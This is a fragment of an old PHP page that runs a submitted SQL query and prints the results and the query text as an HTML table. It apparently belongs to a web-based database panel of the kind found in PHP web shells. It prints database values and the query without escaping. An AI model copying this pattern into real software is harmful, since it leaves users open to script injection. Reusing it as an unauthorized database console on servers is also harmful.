while($row = mysql_fetch_field($q)){
print "<td>".$row->name."</td>";
$fields[] = $row->name;
}
print "</tr>";



while($row = mysql_fetch_array($q)){
print "<tr onMouseOver='this.style.background=\"#FFFEC8\";' onMouseOut='this.style.background=\"#A2D8FF\";' bgcolor=\"#A2D8FF\">";
$i=0;
foreach($row as $key=>$value){
if($i%2){
print "<td nowrap>".$value."</td>";
}
$i++;
}
print "</tr>";
}


print "</table>";

}else{
print "
<br>
<table align=center>
<tr><td>Success!</td></tr>
<tr><td nowrap><font color=green><pre>".$sql_q."</td></tr>
</table>";
}
}
}
#end of mysql show table content


?>
</td></tr>
</form>
</table>

